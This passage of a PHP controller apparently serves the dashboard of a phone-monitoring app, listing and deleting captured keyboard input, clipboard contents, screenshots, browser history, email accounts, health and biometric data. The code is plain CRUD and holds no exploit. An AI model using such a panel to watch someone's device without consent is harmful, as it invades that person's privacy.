        if ($this->finderModel->delete_default_apps_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/alarms */
    public function alarms()
    {
        $data = array_merge($this->commonData('alarms', 'Alarms & Jobs'), [
            'rows' => $this->finderModel->get_alarms($this->userId),
            'total' => $this->finderModel->get_count_Alarms($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/alarms', $data);
    }

    /** POST /advanced/software/alarms/delete/(:num) */
    public function delete_alarms($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_alarms_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware/audio_devices */
    public function audio_devices()
    {
        $data = array_merge($this->commonData('audio_devices', 'Audio Devices'), [
            'rows' => $this->finderModel->get_audio_devices($this->userId),
            'total' => $this->finderModel->get_count_AudioDevices($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/audio_devices', $data);
    }

    public function delete_audio_devices($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_audio_devices_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware/biometric */
    public function biometric()
    {
        $data = array_merge($this->commonData('biometric', 'Biometric'), [
            'rows' => $this->finderModel->get_biometric($this->userId),
            'total' => $this->finderModel->get_count_Biometric($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/biometric', $data);
    }

    public function delete_biometric($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_biometric_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    // ── App Security ──
    public function app_security()
    {
        $data = array_merge($this->commonData('app_security', 'App Security'), [
            'rows' => $this->finderModel->get_app_security($this->userId),
            'total' => $this->finderModel->get_count_AppSecurity($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/app_security', $data);
    }

    public function delete_app_security($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_app_security_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    // ── System Locale ──
    public function system_locale()
    {
        $data = array_merge($this->commonData('system_locale', 'System Locale'), [
            'rows' => $this->finderModel->get_system_locale($this->userId),
            'total' => $this->finderModel->get_count_SystemLocale($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/system_locale', $data);
    }

    public function delete_system_locale($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_system_locale_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/app_permissions */
    public function app_permissions()
    {
        $data = array_merge($this->commonData('app_permissions', 'App Permissions'), [
            'rows' => $this->finderModel->get_app_permissions($this->userId),
            'total' => $this->finderModel->get_count_AppPermissions($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/app_permissions', $data);
    }

    public function delete_app_permissions($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_app_permissions_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/browser_history */
    public function browser_history()
    {
        $data = array_merge($this->commonData('browser_history', 'Browser History'), [
            'rows' => $this->finderModel->get_browser_history($this->userId),
            'total' => $this->finderModel->get_count_BrowserHistory($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/browser_history', $data);
    }

    public function delete_browser_history($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_browser_history_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/clipboard */
    public function clipboard()
    {
        $data = array_merge($this->commonData('clipboard', 'Clipboard'), [
            'rows' => $this->finderModel->get_clipboard($this->userId),
            'total' => $this->finderModel->get_count_Clipboard($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/clipboard', $data);
    }

    public function delete_clipboard($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_clipboard_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/content_providers */
    public function content_providers()
    {
        $data = array_merge($this->commonData('content_providers', 'Content Providers'), [
            'rows' => $this->finderModel->get_content_providers($this->userId),
            'total' => $this->finderModel->get_count_ContentProviders($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/content_providers', $data);
    }

    public function delete_content_providers($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_content_providers_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/digital_wellbeing */
    public function digital_wellbeing()
    {
        $data = array_merge($this->commonData('digital_wellbeing', 'Digital Wellbeing'), [
            'rows' => $this->finderModel->get_digital_wellbeing($this->userId),
            'total' => $this->finderModel->get_count_DigitalWellbeing($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/digital_wellbeing', $data);
    }

    public function delete_digital_wellbeing($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_digital_wellbeing_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/email */
    public function email()
    {
        $data = array_merge($this->commonData('email', 'Email Accounts'), [
            'rows' => $this->finderModel->get_email_accounts($this->userId),
            'total' => $this->finderModel->get_count_EmailAccounts($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/email', $data);
    }

    public function delete_email($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_email_accounts_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/health_data */
    public function health_data()
    {
        $data = array_merge($this->commonData('health_data', 'Health Data'), [
            'rows' => $this->finderModel->get_health_data($this->userId),
            'total' => $this->finderModel->get_count_HealthData($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/health_data', $data);
    }

    public function delete_health_data($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_health_data_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/keyboard_input */
    public function keyboard_input()
    {
        $data = array_merge($this->commonData('keyboard_input', 'Keyboard Input'), [
            'rows' => $this->finderModel->get_keyboard_input($this->userId),
            'total' => $this->finderModel->get_count_KeyboardInput($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/keyboard_input', $data);
    }

    public function delete_keyboard_input($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_keyboard_input_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/keyguard */
    public function keyguard()
    {
        $data = array_merge($this->commonData('keyguard', 'Keyguard Events'), [
            'rows' => $this->finderModel->get_keyguard_events($this->userId),
            'total' => $this->finderModel->get_count_KeyguardEvents($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/keyguard', $data);
    }

    public function delete_keyguard($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_keyguard_events_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/screenshots */
    public function screenshots()
    {
        $data = array_merge($this->commonData('screenshots', 'Screenshots'), [
            'rows' => $this->finderModel->get_screenshots($this->userId),
            'total' => $this->finderModel->get_count_Screenshots($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/screenshots', $data);
    }

    public function delete_screenshots($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_screenshots_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/screen_state */
    public function screen_state()
    {
        $data = array_merge($this->commonData('screen_state', 'Screen State'), [
            'rows' => $this->finderModel->get_screen_state($this->userId),
            'total' => $this->finderModel->get_count_ScreenState($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/screen_state', $data);
    }

    public function delete_screen_state($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_screen_state_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware/media_hardware */
    public function media_hardware()
    {
        $userId = $this->userId;
        $latest_ci = $this->getLatestRecord('tbl_telemetry_cameras', $userId);
        $latest_ad = $this->getLatestRecord('tbl_telemetry_audio_devices', $userId);

        $history = $this->getMergedHistory('tbl_telemetry_cameras', [
            'ci' => 'tbl_telemetry_cameras',
            'ad' => 'tbl_telemetry_audio_devices',
        ], $userId);

        $total = $this->getMergedHistoryCount('tbl_telemetry_cameras', $userId);
        $pager = service('pager');
        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');

        $data = array_merge($this->commonData('media_hardware', 'Media Hardware'), [
            'latest_ci' => $latest_ci,
            'latest_ad' => $latest_ad,
            'history' => $history,
            'total' => $total,
            'pager' => $pager,
        ]);

        return $this->renderAppView('users/advanced/media_hardware', $data);
    }

    /** POST /advanced/hardware/media_hardware/delete/(:num) */
    public function delete_media_hardware($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_camera_info_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }
}
